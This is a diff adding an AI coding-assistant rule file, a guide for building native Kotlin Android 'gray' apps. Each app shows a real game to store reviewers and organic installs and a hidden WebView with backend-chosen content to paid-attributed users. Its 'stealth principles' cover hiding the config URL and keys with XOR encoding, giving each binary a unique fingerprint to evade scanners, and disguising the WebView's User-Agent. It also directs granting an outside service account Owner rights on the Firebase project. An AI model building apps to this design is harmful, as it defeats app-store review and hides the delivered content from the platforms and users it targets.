@@ -1,0 +1,268 @@
+---
+description: Android Gray Flow — full integration guide for native Kotlin gray-part apps (state machine, AppsFlyer attribution gate, config endpoint, push, project layout). Read this first for any gray-part Kotlin task.
+globs: app/src/main/java/**/*.kt,app/src/main/AndroidManifest.xml,app/build.gradle.kts
+alwaysApply: false
+---
+
+# Android Gray Flow — Native Kotlin Integration Guide
+
+This is the canonical guide for building a **native Kotlin** gray-part app
+(no Flutter). It mirrors the Flutter gray template but uses Activities, OkHttp,
+the AppsFlyer Android SDK and Firebase Messaging directly.
+
+---
+
+## What is the gray flow
+
+A dual-mode app:
+
+- **Stream mode (online / "gray"):** a full-screen `WebView` shows a URL returned
+  by a remote backend. The app is a thin shell.
+- **Native mode (offline / "фантик" / white):** a real native game/content shown
+  to organic / unattributed users.
+
+The backend decides per user based on **AppsFlyer attribution**. Paid
+(non-organic) users get the WebView; organic users get the native content.
+
+**Why:** one binary, two experiences chosen at runtime. The native game is the
+legitimate store-review content; the WebView delivers partner content to
+targeted users only.
+
+---
+
+## Stealth principles (don't break these)
+
+1. Real native game = real review content (reviewer/scanner sees the game).
+2. XOR-encode all sensitive strings (config URL, AppsFlyer key, Firebase #,
+   GCD URL). Never hardcode them at the call site.
+3. Attribution gate: only paid installs see the WebView. A reviewer doing an
+   organic install gets the game.
+4. **Unique binary fingerprint per project** — different codec seed, class
+   names, package layout, library versions. See `kotlin_fingerprint.mdc`.
+5. Real device User-Agent on every request (no `; wv` / Flutter fingerprint).
+   See `kotlin_webview.mdc`.
+
+---
+
+## Reference project layout (rename per project — see fingerprint rule)
+
+```
+app/src/main/java/<pkg>/
+├── startup/
+│   ├── AppEntry.kt          Application: Firebase + AppCheck + AppsFlyer init
+│   └── WelcomePortal.kt     LAUNCHER: gray/white routing + branded splash
+├── portal/
+│   ├── StreamPortal.kt      Full-screen WebView shell (gray)
+│   ├── KeyboardPan.kt       Slides the WebView clear of the keyboard
+│   ├── AlertPortal.kt       Push-permission promo (Accept / Skip)
+│   └── OfflinePortal.kt     No-internet screen + Retry
+├── reach/
+│   ├── ReachDispatch.kt     POST to config endpoint (OkHttp)
+│   └── TrackingDispatch.kt  AppsFlyer: prime/ignite, deep link, GCD, re-ask
+├── signal/
+│   ├── PushRelay.kt         FirebaseMessagingService
+│   └── PushBus.kt           process-wide warm-URL hand-off (callback + queue)
+├── vault/
+│   ├── CipherVault.kt       XOR deobfuscator (unique seed per project)
+│   └── DataVault.kt         SharedPreferences + EncryptedSharedPreferences
+├── wire/
+│   └── NetWire.kt           connectivity (default network callback + TCP probe)
+├── blueprint/
+│   ├── AppBlueprint.kt      central config: bundle, timeouts, encoded strings
+│   ├── RunChannel.kt        enum STREAM / NATIVE / UNDECIDED
+│   └── ChannelResult.kt     config response model
+└── <game>/...               native game (white part) — do not entangle with gray
+
+app/src/main/res/
+├── drawable/ic_notif_<x>.xml        monochrome notification icon (NOT launcher)
+├── drawable-nodpi/*.webp            gray screen backgrounds (WebP, orientation-aware)
+└── xml/network_security_config.xml  cleartextTrafficPermitted=true
+
+app/google-services.json             Firebase config (release package only)
+keystore/keystore.properties         signing creds (gitignored)
+```
+
+---
+
+## State machine (implement in WelcomePortal)
+
+```
+runChannel == UNDECIDED (first launch)
+  ├─ cold push URL present? → STREAM with that URL (highest priority)
+  ├─ no internet → OfflinePortal ON THE FIRST FRAME. Nothing started, nothing
+  │    persisted; the link returning restarts this whole router. NEVER the game
+  │    — an install that came through a link must still reach the WebView.
+  ├─ has internet:
+  │    ├─ start AppsFlyer NOW, not earlier (see kotlin_launch_flow.mdc §1–2)
+  │    ├─ await conversion (30s) and deferred deep link (5s) in parallel
+  │    ├─ build POST body (attribution + deep link + device + push + firebase)
+  │    ├─ ReachDispatch.fetchChannel(body)
+  │    ├─ ok+url → save url+expires, runChannel=STREAM → AlertPortal?→StreamPortal
+  │    └─ else   → game; persist NATIVE only if the endpoint answered AND the
+  │               attribution was non-empty, otherwise leave UNDECIDED
+
+runChannel == STREAM (returning, was WebView)
+  ├─ cold push URL → StreamPortal (highest priority, one-time)
+  ├─ no internet → OfflinePortal (with savedUrl if any)
+  ├─ start AppsFlyer, attribution (10s) → fetchChannel
+  │    ├─ ok+url → StreamPortal(new url) + persist
+  │    ├─ fail + savedUrl(not expired) → StreamPortal(savedUrl)
+  │    └─ fail + no saved → OfflinePortal
+
+runChannel == NATIVE (returning, was game)
+  └─ native game, ALWAYS, no network needed, AppsFlyer not started
+```
+
+Key invariant: **once the backend says native, the user stays native forever**
+(don't re-query, don't show WebView on later visits). The backend owns the
+conversion decision, not the client.
+
+The counter-invariant, equally hard: **a "no" is only recorded when a server
+actually said it, to a request that actually carried attribution.** A transport
+failure or an empty conversion map is not a verdict — open the game for that
+run and leave the channel UNDECIDED. Full reasoning and code in
+`kotlin_launch_flow.mdc` §5.
+
+Everything about *when* each step may run — the two-stroke AppsFlyer start, the
+offline first launch, the timeouts, and the log lines that prove it works —
+lives in **`kotlin_launch_flow.mdc`**. Read it before writing the router.
+
+---
+
+## Backend config contract
+
+`POST <configEndpoint>` · `Content-Type: application/json` · timeout 15s.
+
+### Request body
+Merge of (priority order, first wins):
+1. AppsFlyer conversion data — **ALL fields, verbatim, never filter/rename**.
+2. Deep-link (UDL) data — only keys not already present.
+3. Device fields (always added, overwrite duplicates):
+   - `af_id` = `AppsFlyerLib.getAppsFlyerUID(ctx)`
+   - `bundle_id` = applicationId
+   - `os` = `"Android"`
+   - `store_id` = applicationId (Android: same as bundle)
+   - `locale` = RFC 3066 (`Locale.getDefault().toLanguageTag()`, `-`→`_`)
+   - `push_token` = FCM token (omit if null/blank)
+   - `firebase_project_id` = Firebase project number
+
+### Response
+```
+200  { "ok": true,  "url": "https://...", "expires": 1689002181 }   → STREAM
+404  { "ok": false, "message": "No data" }                          → NATIVE
+```
+- `expires` is a Unix timestamp; on returning launches, if expired → re-query.
+- **HTTP 404 (or any non-2xx) = negative answer → native/offline**, not a crash.
+- Re-query fails but a non-expired saved URL exists → use the saved URL.
+
+### Critical: the af_status gate
+For tests the backend only returns a URL when `"af_status":"Non-organic"`.
+If attribution is empty/Organic, expect 404 → native. This is correct.
+
+---
+
+## AppsFlyer attribution (the part most likely to be wrong)
+
+**`kotlin_launch_flow.mdc` is the authority here.** The short version:
+
+- `subscribeForDeepLink` + `init(key, listener, appContext)` in
+  `Application.onCreate`; the listener goes INTO `init`, never registered after
+  `start`. Bridge the callback to a coroutine with `CompletableDeferred`.
+- `start(activity)` from the router, **after** connectivity is confirmed, and
+  **with the Activity** — an application context passed from inside an activity
+  does not trigger the SDK at all.
+- Never let the SDK start offline: the failed conversion it caches is final for
+  the session and turns a paid install into an organic one.
+- Await the conversion and the deferred deep link in parallel.
+- `af_status == "Organic"` may be a false positive on first run. Wait
+  `~5s`, then call the **GCD API** and prefer its result:
+  `GET <gcdBase><bundleId>?device_id=<appsFlyerUID>` with
+  `Authorization: Bearer <devKey>`. The same call is the fallback when the SDK
+  reports nothing at all.
+- Timeouts: first launch 30s, returning online 10s, deep-link 5s, re-ask 8s.
+- NEVER modify the conversion field set.
+
+---
+
+## Push notifications (FCM)
+
+- Show `AlertPortal` (custom permission screen) **before** the WebView when
+  `shouldShowNotifScreen()` is true. Buttons: **Accept** / **Skip**.
+- Accept → request `POST_NOTIFICATIONS` (API 33+) → system dialog.
+- Skip → `skipUntil = now + 259200` (3 days), show again later.
+- System **denied** → set a permanent `notifOsDenied` flag (never show again).
+  Without it the screen reappears after 3 days but the system dialog won't open.
+- Push URL routing:
+  - **Cold start** (app killed): save URL → WelcomePortal opens it next launch.
+  - **Warm** (app foreground/visible): hand URL to the live WebView via a
+    process-wide bus callback — DO NOT persist (one-time only).
+- Notification icon: separate **monochrome** vector (a flame for this theme),
+  never the launcher icon. Support `BigPictureStyle` for image pushes.
+- FCM service backend: add `marla-export@marfa-290610.iam.gserviceaccount.com`
+  as Owner in the Firebase project's GCP IAM.
+
+---
+
+## App requirements (per TZ)
+
+| Requirement | Value |
+|---|---|
+| Android target / min SDK | 35 / 30 (use lowest the stores + SDKs allow) |
+| App size | < 100 MB (use WebP for screen art, not multi-MB PNG) |
+| Loading screen | animated indicator, adapts portrait + landscape, <10s |
+| Push promo screen | adapts portrait + landscape |
+| Adaptive icon | fills the shape, no borders, no clipping |
+| Notification icon | separate monochrome icon (Android) |
+| WebView | Safe Area in any orientation + after lock/unlock |
+| Rotation | allow system rotation / sensor auto-rotate |
+| Back | WebView goes back; back on first page does NOT close app |
+| ERR_TOO_MANY_REDIRECTS | keep loading the last main-frame URL, retry up to 6 |
+| Redirect hops | invisible to the user — a cover, never a second splash |
+| JS / cookies / sessions | enabled |
+| inline autoplay video | `mediaPlaybackRequiresUserGesture = false` |
+| file upload | WebChromeClient file chooser, no extra perms |
+| keyboard | must not cover focused input |
+| Privacy policy | reachable per store rules |
+
+---
+
+## Build & release
+
+- `buildFeatures { buildConfig = true }` if you reference `BuildConfig`.
+- Release signing from `keystore/keystore.properties` (gitignored).
+- Debug build: **do NOT** add `applicationIdSuffix=".debug"` — it breaks
+  AppsFlyer attribution & OneLink (they're registered for the real bundle).
+  See pitfalls rule.
+- Build: `gradlew assembleRelease bundleRelease`. Ship the AAB to Play.
+- Install on a locked device with `adb install -r` (not `gradlew installDebug`).
+
+---
+
+## The loading screen is one session per launch
+
+The bar belongs to the launch, not to any single activity, and the user sees it
+exactly once — at startup. Everything else that loads (redirects, a push URL, a
+page after the permission screen) hides behind a cover, never behind a second
+splash. See `kotlin_webview.mdc` §"Loading session and the cover".
+
+Rules that came straight from client feedback:
+
+- The bar must reach 100% before the launch hands over to anything — game,
+  WebView or push URL — and the handover follows within ~0.5 s. Not before, not
+  seconds after.
+- Accepting the notification permission must NOT bring the splash back. The
+  permission screen stays up until the page behind it is ready.
+- Returning from a warm push must not show a splash at all: the user should see
+  the page they left, then the pushed URL.
+
+---
+
+## Companion rules
+
+| File | Read it when |
+|---|---|
+| `kotlin_launch_flow.mdc` | Touching the Application class, the router, or attribution. **The most bug-prone area — read first.** |
+| `kotlin_webview.mdc` | Implementing or fixing the WebView shell. |
+| `kotlin_keyboard.mdc` | The keyboard covers an input, or content jumps when it opens. |
+| `kotlin_gray_pitfalls.mdc` | Anything is broken. Every entry is a bug that really happened. |
+| `kotlin_fingerprint.mdc` | Always, before writing the first file of a new project. |
